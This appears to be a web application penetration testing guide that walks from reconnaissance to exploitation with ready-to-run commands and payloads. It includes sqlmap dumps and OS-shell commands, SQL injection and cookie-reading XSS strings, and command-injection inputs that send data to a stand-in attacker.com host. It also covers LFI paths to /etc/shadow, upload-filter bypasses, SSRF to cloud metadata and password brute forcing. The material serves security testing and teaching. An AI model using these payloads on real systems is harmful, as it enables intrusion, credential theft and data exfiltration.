# Web Application Security Testing

## Overview

Web application testing is often the most fruitful attack vector. This guide covers the full web testing workflow: from mapping to exploitation.

## Stage 1: Mapping & Discovery

### Technology Fingerprinting

```bash
# Identify web technologies, server, CMS
whatweb http://target
wappalyzer (browser extension)

# HTTP header analysis
curl -I http://target
nmap -p 80,443 --script=http-headers target

# SSL/TLS analysis
sslscan target
sslyze --regular target
```

### Directory & File Discovery

```bash
# Gobuster - fast directory brute forcing
gobuster dir -u http://target \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,txt,html,bak,old,zip \
  -t 50 \
  -o gobuster_results.txt
# -x: file extensions to check, -t: threads, -o: output file

# Recursive directory scanning
feroxbuster -u http://target -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt --depth 3

# Common backup file discovery
gobuster dir -u http://target -w /usr/share/wordlists/dirb/common.txt -x .bak,.old,.backup,.save,.txt,.swp
```

### API Endpoint Discovery

```bash
# Common API paths
gobuster dir -u http://target -w /usr/share/wordlists/seclists/Discovery/Web-Content/api/api-endpoints.txt

# If you find an API, check for documentation
curl http://target/api/v1/
curl http://target/swagger-ui.html
curl http://target/api-docs
curl http://target/openapi.json
```

### Subdomain Enumeration (for web scope)

```bash
# Passive subdomain discovery
subfinder -d target.com -o subdomains.txt

# Active subdomain brute force
gobuster dns -d target.com -w /usr/share/wordlists/amass/subdomains-top1mil-5000.txt

# Virtual host discovery
gobuster vhost -u http://target.com -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt
```

## Stage 2: Vulnerability Scanning

### Automated Scanning

```bash
# Nikto - web server vulnerability scanner
nikto -h http://target -output nikto_results.html -Format htm

# OWASP ZAP (GUI-based, comprehensive)
zaproxy

# Nuclei - template-based vulnerability scanner
nuclei -u http://target -o nuclei_results.txt

# WPScan (WordPress-specific)
wpscan --url http://target --enumerate u,vp,vt,dbe
# u: users, vp: vulnerable plugins, vt: vulnerable themes, dbe: database exports
```

## Stage 3: Manual Testing - Common Vulnerabilities

### SQL Injection

```bash
# Basic SQL injection test with sqlmap
sqlmap -u "http://target/page.php?id=1" --batch --dbs
# --batch: use defaults, --dbs: enumerate databases

# POST-based SQL injection
sqlmap -u "http://target/login.php" --data="user=admin&pass=test" --batch

# With cookie authentication
sqlmap -u "http://target/page.php?id=1" --cookie="session=abc123" --batch --dbs

# OS shell via SQL injection (if stacked queries supported)
sqlmap -u "http://target/page.php?id=1" --os-shell

# Extract specific data
sqlmap -u "http://target/page.php?id=1" -D database_name -T users --dump
# -D: database, -T: table, --dump: extract data
```

Manual SQL injection testing patterns:
```
# Authentication bypass
' OR '1'='1' -- -
' OR 1=1 -- -
admin'--

# Union-based
' UNION SELECT 1,2,3 -- -
' UNION SELECT table_name,2,3 FROM information_schema.tables -- -

# Error-based
' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) -- -

# Blind boolean-based
' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a' -- -

# Time-based blind
' AND SLEEP(5) -- -
```

### Cross-Site Scripting (XSS)

```bash
# Reflected XSS test payloads
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
javascript:alert('XSS')

# XSS testing with dalfox (automated)
dalfox url http://target/page?param=value

# Stored XSS - test in input fields, comments, profile fields
# Test with: <img src=x onerror=alert(document.cookie)>
```

### Command Injection

```bash
# Test parameters for OS command injection
; ls -la
| whoami
$(whoami)
`id`
&& cat /etc/passwd
|| cat /etc/passwd

# Blind command injection (use out-of-band)
; nslookup $(whoami).attacker.com
| curl http://attacker.com/$(whoami)
```

### Local/Remote File Inclusion (LFI/RFI)

```bash
# LFI - basic traversal
../../../etc/passwd
....//....//....//etc/passwd

# PHP filter wrapper (read source code)
php://filter/convert.base64-encode/resource=index.php

# PHP input wrapper (code execution)
php://input
# POST body: <?php system('id'); ?>

# Log poisoning via LFI
# 1. Inject PHP code into User-Agent header
# 2. Include the log file
../../../var/log/apache2/access.log

# Common LFI paths on Linux:
/etc/passwd
/etc/shadow
/proc/self/environ
/var/log/apache2/access.log
/var/log/auth.log
```

### File Upload Vulnerabilities

```bash
# Bypass file extension checks
shell.php.jpg        # Double extension
shell.php%00.jpg     # Null byte (older PHP)
shell.phtml          # Alternative PHP extension
shell.php5           # PHP5 extension
shell.PhP            # Case bypass

# Content-Type bypass (intercept with Burp)
# Change Content-Type to: image/jpeg, image/png

# Magic bytes bypass (prepend image header)
# Add GIF89a before PHP code
```

### Authentication Testing

```bash
# Brute force login with Hydra
hydra -l admin -P /usr/share/wordlists/rockyou.txt target http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect"

# Brute force HTTP Basic Auth
hydra -l admin -P /usr/share/wordlists/rockyou.txt target http-get /admin/

# JWT token attacks
# Check for "none" algorithm: modify header to {"alg":"none"}, remove signature
# Check for algorithm confusion: RS256 → HS256 with public key as HMAC secret

# Session fixation / hijacking
# Test if session cookie changes after login
# Test if session cookie is settable via URL parameter
```

### SSRF (Server-Side Request Forgery)

```bash
# Test parameters that accept URLs
http://127.0.0.1
http://localhost
http://169.254.169.254/latest/meta-data/  # AWS metadata
http://[::1]             # IPv6 localhost
http://0x7f000001        # Hex IP bypass
http://2130706433        # Decimal IP bypass
http://0177.0.0.1        # Octal IP bypass
```

## Stage 4: CMS-Specific Testing

### WordPress

```bash
# Comprehensive WordPress scan
wpscan --url http://target --enumerate u,vp,vt,dbe --api-token YOUR_TOKEN

# Brute force WordPress login
wpscan --url http://target --passwords /usr/share/wordlists/rockyou.txt --usernames admin
```

### Other CMS

```bash
# Drupal
droopescan scan drupal -u http://target

# Joomla
joomscan -u http://target
```

## Burp Suite Workflow

For comprehensive web testing, Burp Suite Community Edition provides:
1. **Proxy** — intercept and modify all HTTP traffic
2. **Repeater** — manually craft and resend requests
3. **Intruder** — automated attacks (limited in Community Edition)
4. **Decoder** — encode/decode data

Setup:
1. Configure browser proxy to 127.0.0.1:8080
2. Install Burp's CA certificate for HTTPS
3. Turn intercept on/off as needed
4. Use scope to limit what Burp captures

## Cheatsheet: Quick Web Test Checklist

- [ ] Technology identification (whatweb, headers)
- [ ] SSL/TLS configuration check
- [ ] Directory/file brute force (gobuster)
- [ ] Run Nikto scan
- [ ] Test all input fields for SQL injection
- [ ] Test all reflected parameters for XSS
- [ ] Test file upload functionality
- [ ] Check authentication mechanisms
- [ ] Test authorization (can normal user access admin pages?)
- [ ] Check for LFI/RFI in file parameters
- [ ] Test API endpoints (if any)
- [ ] Check for information disclosure (error pages, source comments)
- [ ] Review cookie security flags (HttpOnly, Secure, SameSite)
